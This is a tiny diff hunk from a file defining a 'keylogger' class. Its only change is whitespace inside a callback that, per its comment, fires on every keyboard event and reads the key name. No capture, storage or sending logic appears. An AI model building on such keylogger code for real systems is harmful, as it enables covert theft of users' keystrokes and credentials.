@@ -23,7 +23,7 @@ class keylogger:
         self.end_dt = datetime.now()
 
     def callback(self, event):
-
+        
         # This callback is invoked whenever a keyboard event is occurred
 
         name = event.name
